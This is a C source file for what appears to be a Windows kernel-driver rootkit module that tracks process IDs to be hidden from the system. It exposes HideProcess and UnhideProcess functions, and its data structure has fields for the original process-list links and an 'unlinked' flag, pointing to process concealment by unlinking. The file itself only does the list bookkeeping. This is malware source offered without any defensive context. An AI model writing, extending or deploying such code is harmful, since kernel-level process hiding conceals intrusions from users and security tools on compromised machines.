#include "process_hider.h"

LIST_ENTRY g_HiddenProcessList;
KSPIN_LOCK g_HiddenProcessLock;
BOOLEAN g_ProcessHidingInitialized = FALSE;

PHIDDEN_PROCESS FindHiddenProcess(HANDLE ProcessId)
{
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);

    PLIST_ENTRY current = g_HiddenProcessList.Flink;
    while (current != &g_HiddenProcessList) {
        PHIDDEN_PROCESS entry = CONTAINING_RECORD(current, HIDDEN_PROCESS, listEntry);
        if (entry->processId == ProcessId) {
            KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
            return entry;
        }
        current = current->Flink;
    }

    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
    return NULL;
}

static VOID AddHiddenProcess(HANDLE ProcessId)
{
    PHIDDEN_PROCESS entry = (PHIDDEN_PROCESS)ExAllocatePoolWithTag(
        NonPagedPool, sizeof(HIDDEN_PROCESS), POOL_TAG);
    if (!entry) return;

    entry->processId = ProcessId;
    entry->process = NULL;
    RtlZeroMemory(&entry->originalFlink, sizeof(LIST_ENTRY));
    RtlZeroMemory(&entry->originalBlink, sizeof(LIST_ENTRY));
    entry->isUnlinked = FALSE;

    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
    InsertTailList(&g_HiddenProcessList, &entry->listEntry);
    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
}

static VOID RemoveHiddenProcess(HANDLE ProcessId)
{
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);

    PLIST_ENTRY current = g_HiddenProcessList.Flink;
    while (current != &g_HiddenProcessList) {
        PHIDDEN_PROCESS entry = CONTAINING_RECORD(current, HIDDEN_PROCESS, listEntry);
        if (entry->processId == ProcessId) {
            RemoveEntryList(&entry->listEntry);
            KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
            ExFreePoolWithTag(entry, POOL_TAG);
            return;
        }
        current = current->Flink;
    }

    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
}

BOOLEAN InitializeProcessHider()
{
    if (g_ProcessHidingInitialized)
        return TRUE;

    InitializeListHead(&g_HiddenProcessList);
    KeInitializeSpinLock(&g_HiddenProcessLock);
    g_ProcessHidingInitialized = TRUE;
    return TRUE;
}

VOID CleanupProcessHider()
{
    if (!g_ProcessHidingInitialized)
        return;

    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);

    while (!IsListEmpty(&g_HiddenProcessList)) {
        PLIST_ENTRY entry = RemoveHeadList(&g_HiddenProcessList);
        KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
        PHIDDEN_PROCESS hidden = CONTAINING_RECORD(entry, HIDDEN_PROCESS, listEntry);
        ExFreePoolWithTag(hidden, POOL_TAG);
        KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
    }

    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
    g_ProcessHidingInitialized = FALSE;
}

NTSTATUS HideProcess(HANDLE ProcessId)
{
    if (!g_ProcessHidingInitialized)
        return STATUS_DEVICE_NOT_READY;

    if (FindHiddenProcess(ProcessId))
        return STATUS_SUCCESS;

    AddHiddenProcess(ProcessId);
    return STATUS_SUCCESS;
}

NTSTATUS UnhideProcess(HANDLE ProcessId)
{
    if (!g_ProcessHidingInitialized)
        return STATUS_DEVICE_NOT_READY;

    if (!FindHiddenProcess(ProcessId))
        return STATUS_NOT_FOUND;

    RemoveHiddenProcess(ProcessId);
    return STATUS_SUCCESS;
}

BOOLEAN IsProcessHidden(HANDLE ProcessId)
{
    if (!g_ProcessHidingInitialized)
        return FALSE;

    return (FindHiddenProcess(ProcessId) != NULL);
}
